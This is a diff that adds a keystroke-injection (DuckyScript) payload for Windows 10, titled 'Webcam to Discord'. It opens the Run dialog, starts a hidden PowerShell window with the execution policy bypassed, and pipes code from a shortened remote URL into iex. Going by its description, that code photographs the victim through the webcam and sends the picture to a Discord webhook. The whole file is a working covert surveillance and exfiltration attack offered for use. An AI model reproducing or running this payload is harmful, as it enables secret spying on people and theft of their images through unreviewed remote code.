@@ -1,0 +1,18 @@
+REM Title: Webcam to Discord
+REM Author: @beigeworm
+REM Description: download a webcam.dll file, find a webcam cand take a picture then send it to discord.
+REM Target: Windows 10
+
+REM Replace YOUR_WEBHOOK_HERE with your Discord webhook URL
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc = 'YOUR_WEBHOOK_HERE' ; irm is.gd/bwcamtodc | iex
+ENTER
+
+
